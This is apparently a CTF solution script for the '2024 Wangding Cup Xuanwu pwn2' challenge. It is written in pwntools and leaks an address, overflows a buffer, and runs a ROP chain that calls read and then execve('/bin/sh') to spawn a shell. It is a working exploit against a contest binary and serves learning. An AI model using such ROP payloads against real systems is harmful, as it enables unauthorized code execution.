# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/CTF大赛WP集合/articles/2024网鼎杯玄武组pwn2题目详解.md
# TITLE: 2024网鼎杯玄武组pwn2题目详解
# CATEGORY: pwn

from pwn import*

    #context.log_level = 'debug'
    #sh = gdb.debug("./pwn","set follow-fork-mode parentn b *0x401953n b *0x401995n cn cn set {long}($rbp-0x28)=1n b *0x")
    #sh = process("./pwn")
    #sh.sendafter("leave your name","A"*64)
    #sh.sendafter("Wanna return?","B")
    #sh.interactive()

rax=0x0000000000450277
rdi=0x000000000040213f
rsi=0x000000000040a1ae
rdxrbx=0x0000000000485feb
sh_addr=0x00000000004C5000
read=0x000000000044F810
syscall=0x41ac26

p=process('/home/kali/Desktop/pwn')
    #p=gdb.debug("./pwn","b *0x000000000040190Cn b *0x401953n b *0x4019B0n b *0x40189Dn b *0x40190Cn set follow-fork-mode parentn ")
p.recvuntil(b'gift: ')
gift=p.recv(18)
gift=int(gift,16)

p.sendafter('leave your name',b'a'*0x28+p64(1))
p.sendafter('Wanna return?','A')
p.sendafter("once again?",b'A'*0x100)
payload=b'A'*0x60
payload+=p64(0x1111111111111111)
payload+=b'B'*0xa0
payload+=p64(gift)
payload+=b'C'*8
payload+=p64(rax)+p64(0x0)+p64(rdxrbx)+p64(0x10)*2+p64(rsi)+p64(sh_addr)+p64(rdi)+p64(0x0)+p64(syscall)
payload+=p64(rax)+p64(0x3B)+p64(rdi)+p64(sh_addr)+p64(rsi)+p64(0x0)+p64(rdxrbx)+p64(0x0)*2+p64(syscall)

p.sendafter("once again?",payload)
p.send(b'/bin/sh')

p.interactive()
